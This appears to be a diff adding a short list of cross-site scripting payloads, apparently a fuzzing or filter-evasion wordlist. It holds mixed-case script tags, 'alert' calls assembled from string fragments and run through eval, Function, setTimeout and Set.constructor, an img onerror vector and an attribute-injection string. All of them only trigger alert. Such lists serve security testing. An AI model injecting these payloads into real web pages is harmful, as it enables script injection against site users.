@@ -1,0 +1,13 @@
+<sCrIpt>alert(1)</ScRipt>
+<script x>
+<script x>alert('XSS')<script y>
+eval('ale'+'rt(0)');
+Function("ale"+"rt(1)")();
+new Function`al\ert\`6\``;
+setTimeout('ale'+'rt(2)');
+setInterval('ale'+'rt(10)');
+Set.constructor('ale'+'rt(13)')();
+Set.constructor`al\x65rt\x2814\x29```;
+<img src='1' onerror='alert(0)' <
+String.fromCharCode(88,83,83)
+" onMouseOver="alert(1);
